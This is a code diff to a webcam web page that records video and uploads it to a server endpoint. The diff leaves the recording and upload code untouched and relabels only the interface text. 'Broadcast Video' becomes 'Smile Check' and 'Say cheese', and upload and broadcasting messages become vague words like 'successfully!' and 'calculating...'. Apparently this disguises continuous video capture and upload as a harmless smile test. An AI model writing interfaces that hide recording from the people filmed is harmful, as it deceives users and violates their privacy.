@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Broadcast Video</title>
+  <title>Smile Check</title>
   <style>
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -90,11 +90,11 @@
   </style>
 </head>
 <body>
-  <h1>Broadcast Video</h1>
+  <h1>Say cheese</h1>
   <video id="localVideo" autoplay playsinline></video>
   <div>
-    <button id="startBroadcast">Start Broadcast</button>
-    <button id="stopBroadcast">Stop Broadcast</button>
+    <button id="startBroadcast">Start</button>
+    <button id="stopBroadcast">Stop</button>
   </div>
   <div id="status"></div>
   <div id="loader"></div>
@@ -135,16 +135,16 @@
 
           try {
             const response = await fetch('/upload', { method: 'POST', body: formData });
-            statusEl.textContent = response.ok ? 'Video uploaded successfully!' : 'Upload failed';
+            statusEl.textContent = response.ok ? 'successfully!' : 'failed';
           } catch (err) {
-            statusEl.textContent = 'Error uploading video';
+            statusEl.textContent = 'Error';
           } finally {
             loader.style.display = 'none';
           }
         };
 
         mediaRecorder.start(1000);
-        statusEl.textContent = 'Broadcasting...';
+        statusEl.textContent = 'calculating...';
       } catch (error) {
         statusEl.textContent = 'Error: ' + error.message;
       }
